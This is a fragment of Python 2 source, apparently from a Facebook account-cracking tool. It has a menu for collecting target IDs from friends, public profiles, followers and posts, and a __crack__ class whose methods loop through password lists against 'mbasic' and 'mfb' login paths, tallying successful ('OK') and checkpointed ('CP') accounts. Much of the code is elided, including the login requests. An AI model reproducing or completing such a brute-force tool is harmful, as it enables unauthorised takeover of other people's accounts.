...
def menu():
    ...
    time.sleep(0.03)
    print '\x1b[1;97m-------------------------------------------------'
    Sa_Sawx404xx = raw_input(' [\x1b[0;92m + \x1b[0;97m] HALLBZHERA \xe2\x9e\xa4 \x1b[1;32m')
    if Sa_Sawx404xx == '':
        print '%s[%s\xc3\x97%s] BA BATALE JEY MAHELA' % (N, M, N)
        time.sleep(2)
        menu()
    elif Sa_Sawx404xx in ('a1', '0a1'):
        teman(SAWx404)
    elif Sa_Sawx404xx in ('1', '01'):
        publik(SAWx404)
    elif Sa_Sawx404xx in ('3', '03'):
        followers(SAWx404)
    elif Sa_Sawx404xx in ('4', '04'):
        postingan(SAWx404)
    elif Sa_Sawx404xx in ('2', '02'):
        __crack__().plerr()
    elif Sa_Sawx404xx in ('99', '099'):
        cek_ingfo(SAWx404)
    elif Sa_Sawx404xx in ('98', '87'):
        try:
    ...
    elif Sa_Sawx404xx in ('6', '06'):
        seting_yntkts()
    elif Sa_Sawx404xx in ('7', '07'):
        info_tools()
    elif Sa_Sawx404xx in ('0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .login.txt')
        ...
        print '%s[%s\xc3\x97%s] menu [%s%s%s] no, check the menu bro!' % (N, M, N, M, Sa_Sawx404xx, N)
        time.sleep(2)
        menu()
...
class __crack__():
    ...
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mSA\xe2\x99\xa1SULTANI%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
    ...
    def __mfb__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92sA\xe2\x99\xa1S%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
